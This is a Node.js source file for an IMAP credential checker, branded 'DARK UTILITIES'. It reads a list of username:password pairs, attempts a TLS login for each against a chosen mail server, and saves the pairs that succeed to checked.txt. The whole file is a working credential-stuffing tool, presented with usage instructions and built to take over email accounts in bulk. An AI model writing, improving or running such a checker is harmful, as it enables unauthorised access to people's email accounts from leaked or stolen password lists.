const fs = require('fs');
const path = require('path');
const Imap = require('imap');
const chalk = require('chalk');

console.log(chalk.red(`
  ╔╦╗╔═╗╦═╗╦╔═    ╦ ╦╔╦╗╦╦  ╦╔╦╗╦╔═╗╔═╗
   ║║╠═╣╠╦╝╠╩╗    ║ ║ ║ ║║  ║ ║ ║║╣ ╚═╗
  ═╩╝╩ ╩╩╚═╩ ╩    ╚═╝ ╩ ╩╩═╝╩ ╩ ╩╚═╝╚═╝
       The power on your side
`))

class Main {
    static formatConsoleDate(date) {
        var hour = date.getHours();
        var minutes = date.getMinutes();
        var seconds = date.getSeconds();
        var milliseconds = date.getMilliseconds();

        return '[' +
            ((hour < 10) ? '0' + hour : hour) +
            ':' +
            ((minutes < 10) ? '0' + minutes : minutes) +
            ':' +
            ((seconds < 10) ? '0' + seconds : seconds) +
            '.' +
            ('00' + milliseconds).slice(-3) +
            '] ';
    }

    static GetArgs() {
        return process.argv.slice(2);
    }
}

if (Main.GetArgs().length < 3) {
    console.log(`${chalk.red("[ERROR]")} bad command usage

        ${chalk.yellow('Usage Sheme:')}
            - user@some_name:~# node ${path.basename(__filename)} <server> <port> <file>
    `);
    process.exit(0);
}


fs.readFile("./" + Main.GetArgs()[2], "utf8", (err, data) => {
    data.split("\r\n").forEach(item => {
        var imap = new Imap({
            user: item.split(":")[0],
            password: item.split(":")[1],
            host: Main.GetArgs()[0],
            port: Main.GetArgs()[1],
            tls: true
        });

        imap.once('ready', function() {
            console.log(chalk.hex('#d6af42')(Main.formatConsoleDate(new Date())) + chalk.green(item.split(":")[0] + " Saved to checked.txt ."))
            fs.appendFile('./checked.txt', `${item.split(":")[0]}:${item.split(":")[1]} \r\n`, function (err) {
                if (err) return console.log(err);
            });

            imap.end();
        });

        imap.once('error', function(err) {
            console.log(chalk.hex('#d6af42')(Main.formatConsoleDate(new Date())) + chalk.red(item.split(":")[0] + " error while connecting."))
            imap.end();
        });

        imap.connect();
    });
});
